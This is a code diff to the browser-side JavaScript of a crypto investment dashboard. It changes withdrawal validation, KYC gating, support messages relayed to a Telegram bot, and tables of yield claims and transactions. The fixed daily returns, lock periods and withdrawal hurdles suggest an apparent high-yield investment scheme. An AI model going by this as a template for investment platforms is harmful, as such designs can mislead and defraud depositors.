-            const methodSelect = document.getElementById('payoutMethodSelect').value;
-            const targetAddress = document.getElementById('payoutTargetAddress').value;
+            if (!currentUserData.kycData || !currentUserData.kycData.isLocked) {
+                alert("KYC Unverified!\n\nYou must complete and submit your KYC Verification in 'My Profile' before requesting a withdrawal.");
+                closeModal('payoutModal');
+                switchMainTab('profile', document.querySelectorAll('.nav-link')[3]);
+                switchProfileCategory('subKyc', document.getElementById('btnKyc'));
+                return;
+            }
 
-            if (methodSelect !== 'cash_manager') {
-                if (!targetAddress || targetAddress.includes("No ") || targetAddress.includes("Saved")) {
-                    alert("You have not saved a valid wallet address for this withdrawal method! Please go to 'My Profile -> Payment Methods' to add your address.");
-                    return;
-                }
+            const wallet = currentUserData.savedWallet || {};
+            const methodSelect = document.getElementById('payoutMethodSelect').value;
+
+            if (methodSelect === 'trc20' && !wallet.trc20) {
+                alert("Missing TRC-20 Address!\n\nPlease add and save your USDT TRC-20 wallet address in 'My Profile' -> Payment Methods before withdrawing via TRC-20.");
+                closeModal('payoutModal');
+                switchMainTab('profile', document.querySelectorAll('.nav-link')[3]);
+                switchProfileCategory('subPayment', document.getElementById('btnPayment'));
+                return;
+            }
+
+            if (methodSelect === 'binance' && !wallet.binance) {
+                alert("Missing Binance Pay ID!\n\nPlease add and save your Binance Pay ID in 'My Profile' -> Payment Methods before withdrawing via Binance Pay.");
+                closeModal('payoutModal');
+                switchMainTab('profile', document.querySelectorAll('.nav-link')[3]);
+                switchProfileCategory('subPayment', document.getElementById('btnPayment'));
+                return;
             }
 
             const todayStr = new Date().toDateString();
@@ -1519,166 +2015,149 @@
             }
 
             if (currentUserData.dailyWithdrawals.count >= 3) {
-                alert("Daily Withdrawal Limit Reached! You can only request up to 3 withdrawals per day.");
+                alert("Daily Withdrawal Limit Exceeded!\n\nYou have reached the maximum 3 withdrawal requests per day limit. Please try again tomorrow.");
+                return;
+            }
+
+            const amt = parseFloat(document.getElementById('payoutAmt').value);
+
+            if (isNaN(amt) || amt <= 0) {
+                alert("Please enter a valid withdrawal amount!");
                 return;
             }
 
             if (amt > 500) {
-                alert("Maximum withdrawal limit is $500 per request!");
+                alert("Maximum withdrawal limit per request is $500!");
                 return;
             }
 
-            if (amt <= 0) {
-                alert("Please enter a valid withdrawal amount.");
+            let minReq = 10;
+            if (currentUserData.activePlans && currentUserData.activePlans.length > 0) {
+                minReq = currentUserData.activePlans[0].minWithdraw;
+            }
+
+            if (amt < minReq) {
+                alert(`Withdrawal amount is lower than the active package minimum threshold of $${minReq}!`);
                 return;
             }
 
-            if (currentUserData.available >= amt) {
-                currentUserData.available -= amt;
-                currentUserData.dailyWithdrawals.count += 1;
-                
-                let methodLabel = 'USDT TRC-20';
-                if(methodSelect === 'binance') methodLabel = 'Binance Pay ID';
-                if(methodSelect === 'cash_manager') methodLabel = 'Deposit Cash Manager / Agent';
-
-                const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
-
-                addTx("Payout & Withdrawal", `-$${amt.toFixed(2)} (${methodLabel})`, "Pending Approval (Cash Agent)");
-                saveSystemDB(); 
-                updateUI(); 
-                closeModal('payoutModal');
-
-                document.getElementById('displayVerificationCode').innerText = verificationCode;
-                openModal('payoutSuccessModal');
-
-                sendTelegramNotification(`<b>💸 Withdrawal Request Alert!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Amount Requested:</b> $${amt.toFixed(2)}\n<b>Method:</b> ${methodLabel}\n<b>Verification Code:</b> <code>${verificationCode}</code>\n<b>Remaining Available Balance:</b> $${currentUserData.available.toFixed(2)}`);
-
-            } else { 
-                alert("Insufficient Available Withdrawal Balance! Transfer funds from Pending Wallet first."); 
+            if (currentUserData.available < amt) {
+                alert(`Insufficient Available Withdrawal Balance! Available balance: $${currentUserData.available.toFixed(2)}.`);
+                return;
             }
+
+            const code = Math.floor(100000 + Math.random() * 900000).toString();
+
+            currentUserData.available -= amt;
+            currentUserData.dailyWithdrawals.count += 1;
+
+            let methodLabel = "USDT TRC-20";
+            let destVal = wallet.trc20;
+            if (methodSelect === 'binance') {
+                methodLabel = "Binance Pay ID";
+                destVal = wallet.binance;
+            } else if (methodSelect === 'cash_manager') {
+                methodLabel = "Deposit Cash Manager / Agent";
+                destVal = "Cash Agent Approval Required";
+            }
+
+            addTx(`Payout Request (${methodLabel})`, `-$${amt.toFixed(2)}`, "Pending Approval");
+            saveSystemDB();
+            updateUI();
+
+            closeModal('payoutModal');
+
+            document.getElementById('displayVerificationCode').innerText = code;
+            openModal('payoutSuccessModal');
+
+            sendTelegramNotification(`<b>💸 Withdrawal Requested!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Amount:</b> $${amt.toFixed(2)}\n<b>Method:</b> ${methodLabel}\n<b>Destination:</b> <code>${destVal}</code>\n<b>Verification Code:</b> <code>${code}</code>\n<b>Remaining Daily Limit:</b> ${3 - currentUserData.dailyWithdrawals.count}/3`);
+
+            document.getElementById('payoutAmt').value = '';
         }
 
-        function filterPlans(category, btnElem) {
-            currentSelectedCategory = category;
-            document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
-            if(btnElem) btnElem.classList.add('active');
-            renderPackages(category);
+        function handleSupportSubmit(e) {
+            e.preventDefault();
+            const name = document.getElementById('supName').value.trim();
+            const email = document.getElementById('supEmail').value.trim();
+            const msg = document.getElementById('supMsg').value.trim();
+
+            document.getElementById('supportResponseBox').style.display = 'flex';
+
+            sendTelegramNotification(`<b>📩 New Support Message Received!</b>\n\n<b>From:</b> ${name}\n<b>Username:</b> ${currentUserData ? currentUserData.profile.username : 'Guest'}\n<b>Email:</b> ${email}\n<b>Message:</b>\n${msg}`);
+
+            document.getElementById('supMsg').value = '';
         }
 
-        function renderPackages(cat = 'daily') {
-            const container = document.getElementById('packagesContainer');
-            const filtered = packagesData.filter(p => p.category === cat);
-
-            container.innerHTML = filtered.map(p => `
-                <div class="pkg-card">
-                    <div class="pkg-badge">${p.badge}</div>
-                    <div>
-                        <div class="pkg-icon-wrap">
-                            <i class="fa-solid ${p.icon}"></i>
-                        </div>
-                        <div class="pkg-header">
-                            <div class="pkg-title">${p.name}</div>
-                        </div>
-                        <div class="pkg-price">$${p.price.toLocaleString()}</div>
-                        <div class="pkg-feature">
-                            <span>Expected Profit Return:</span>
-                            <strong style="color:var(--accent-green);">${p.returnLabel}</strong>
-                        </div>
-                        <div class="pkg-feature">
-                            <span>Min Withdrawal:</span>
-                            <strong>$${p.minWithdraw.toLocaleString()}</strong>
-                        </div>
-                        <div class="pkg-feature">
-                            <span>Plan Category:</span>
-                            <span style="color:var(--accent-cyan); font-weight:700; text-transform:uppercase;">${p.category}</span>
-                        </div>
-                    </div>
-                    <button class="btn btn-gold" style="margin-top: 24px;" onclick="buyPackage(${p.id})">
-                        <i class="fa-solid fa-cart-shopping"></i> Invest $${p.price.toLocaleString()}
-                    </button>
-                </div>
-            `).join('');
+        function addTx(type, amount, status) {
+            const tx = {
+                id: "#TX-" + Math.floor(100000 + Math.random() * 900000),
+                type: type,
+                amount: amount,
+                status: status,
+                date: new Date().toLocaleString()
+            };
+            currentUserData.transactions.unshift(tx);
         }
 
         function renderClaimsTable() {
-            const tbody = document.getElementById('claimsTableBody');
-            if(currentUserData.activePlans.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color: var(--text-muted);">No Active Investment Packages Found. Subscribe to a tier to activate daily switch.</td></tr>`;
+            const body = document.getElementById('claimsTableBody');
+            if (!currentUserData.activePlans || currentUserData.activePlans.length === 0) {
+                body.innerHTML = `
+                    <tr>
+                        <td colspan="6" style="text-align: center; color: var(--text-muted); padding: 24px;">
+                            No active investments yet. Activate a plan in Investment Tiers to enable daily yield harvesting.
+                        </td>
+                    </tr>
+                `;
                 return;
             }
+
             const claimed = isClaimedToday();
-            tbody.innerHTML = currentUserData.activePlans.map((p, idx) => `
+
+            body.innerHTML = currentUserData.activePlans.map(pkg => `
                 <tr>
-                    <td style="font-weight:700;">${p.name}</td>
-                    <td style="text-transform:uppercase; font-size:12px; font-weight:700; color:var(--accent-gold);">${p.category}</td>
-                    <td>$${p.price.toLocaleString()}</td>
-                    <td style="color:var(--accent-green); font-weight:700;">${p.returnLabel}</td>
-                    <td>$${p.minWithdraw.toLocaleString()}</td>
-                    <td style="text-align:center;">
-                        <label class="big-switch" style="width:54px; height:28px;">
-                            <input type="checkbox" ${claimed ? 'disabled' : ''} onchange="claimPackageYield(${idx}, this)">
-                            <span class="slider" style="border-radius:28px;"></span>
-                        </label>
+                    <td style="font-weight: 700; color: #FFF;">${pkg.name}</td>
+                    <td style="text-transform: capitalize; color: var(--accent-gold); font-weight: 600;">${pkg.category}</td>
+                    <td>$${pkg.price.toFixed(2)}</td>
+                    <td style="color: var(--accent-green); font-weight: 700;">${pkg.returnLabel}</td>
+                    <td>$${pkg.minWithdraw}.00</td>
+                    <td style="text-align: center;">
+                        <span style="font-size: 11px; font-weight: 700; color: ${claimed ? 'var(--text-muted)' : 'var(--accent-green)'};">
+                            ${claimed ? 'Claimed Today (24H Lock)' : 'Ready to Claim on Dashboard Switch'}
+                        </span>
                     </td>
                 </tr>
             `).join('');
         }
 
-        function claimPackageYield(index, checkbox) {
-            if(!checkbox.checked) return;
-
-            if (isClaimedToday()) {
-                alert("You have already claimed your daily yield for today! Please try again in 24 hours.");
-                checkbox.checked = false;
-                checkbox.disabled = true;
+        function renderTransactionsTable() {
+            const body = document.getElementById('txTableBody');
+            if (!currentUserData.transactions || currentUserData.transactions.length === 0) {
+                body.innerHTML = `
+                    <tr>
+                        <td colspan="5" style="text-align: center; color: var(--text-muted); padding: 24px;">
+                            No system transactions logged yet.
+                        </td>
+                    </tr>
+                `;
                 return;
             }
 
-            const plan = currentUserData.activePlans[index];
-            currentUserData.pending += plan.dailyVal;
-            currentUserData.lastClaimTimestamp = new Date().getTime();
-            addTx("Daily Claim", `+$${plan.dailyVal.toFixed(2)} (${plan.name})`, "Pending Profit");
-            saveSystemDB(); 
-            updateUI();
+            body.innerHTML = currentUserData.transactions.map(tx => {
+                let statusColor = "var(--accent-green)";
+                if (tx.status.includes("Pending")) statusColor = "var(--accent-gold)";
+                if (tx.status.includes("Failed")) statusColor = "#EF4444";
 
-            setTimeout(() => {
-                checkbox.checked = false;
-                checkbox.disabled = true;
-                alert(`Successfully added $${plan.dailyVal.toFixed(2)} from ${plan.name} to Pending Profit Wallet!`);
-                renderClaimsTable();
-                checkDailyClaimStatus();
-            }, 5000);
-        }
-
-        function buyPackage(pkgId) {
-            const now = new Date().getTime();
-
-            if (currentUserData.activePlans.length > 0 && currentUserData.investmentStartDate) {
-                const daysDiff = Math.floor((now - currentUserData.investmentStartDate) / (1000 * 60 * 60 * 24));
-                if (daysDiff < 30) {
-                    const remaining = 30 - daysDiff;
-                    alert(`Package Subscription Restricted!\n\nNotice: You already have an active plan. A 30-day lock period is active.\n\n- Days Completed: ${daysDiff}/30 Days\n- Remaining Lock Days: ${remaining} Day(s)`);
-                    return;
-                }
-            }
-
-            const pkg = packagesData.find(p => p.id === pkgId);
-            if(currentUserData.deposit < pkg.price) { 
-                return alert('Insufficient Deposit Balance! Please recharge your account.'); 
-            }
-            
-            currentUserData.deposit -= pkg.price;
-            currentUserData.activePlans = [{ ...pkg, lastClaimed: "" }];
-            currentUserData.investmentStartDate = now;
-
-            addTx("Package Subscription", `-$${pkg.price.toFixed(2)} (${pkg.name})`, "Completed");
-            saveSystemDB(); 
-            updateUI(); 
-            renderClaimsTable(); 
-
-            sendTelegramNotification(`<b>💎 Package Subscribed!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Plan:</b> ${pkg.name}\n<b>Price:</b> $${pkg.price}`);
-
-            alert(`Successfully invested in ${pkg.name}! Your 30-day investment period has started.`);
+                return `
+                    <tr>
+                        <td style="font-weight: 700; color: var(--accent-gold);">${tx.id}</td>
+                        <td style="font-weight: 600; color: #FFF;">${tx.type}</td>
+                        <td style="font-weight: 700;">${tx.amount}</td>
+                        <td style="color: var(--text-muted); font-size: 12px;">${tx.date}</td>
+                        <td><span style="color: ${statusColor}; font-weight: 700;">${tx.status}</span></td>
+                    </tr>
+                `;
+            }).join('');
         }
 
         function updateUI() {
@@ -1686,28 +2165,10 @@
             document.getElementById('dashPending').innerText = `$${currentUserData.pending.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
             document.getElementById('dashAvailable').innerText = `$${currentUserData.available.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
             
-            const hasActive = currentUserData.activePlans.length;
-            document.getElementById('dashActiveCount').innerText = `${hasActive} / 1 Active`;
-            renderTx();
-        }
+            const activeCount = currentUserData.activePlans ? currentUserData.activePlans.length : 0;
+            document.getElementById('dashActiveCount').innerText = `${activeCount} / 1 Active`;
 
-        function addTx(type, amount, status) {
-            const tx = { id: '#TX-' + Math.floor(100000 + Math.random() * 900000), type, amount, status, date: new Date().toLocaleString() };
-            currentUserData.transactions.unshift(tx);
-            renderTx();
-        }
-
-        function renderTx() {
-            const tbody = document.getElementById('txTableBody');
-            tbody.innerHTML = currentUserData.transactions.map(t => `
-                <tr>
-                    <td>${t.id}</td>
-                    <td>${t.type}</td>
-                    <td>${t.amount}</td>
-                    <td>${t.date}</td>
-                    <td><span style="color:var(--accent-gold); font-weight:700;">${t.status}</span></td>
-                </tr>
-            `).join('');
+            renderTransactionsTable();
         }
     </script>
 </body>
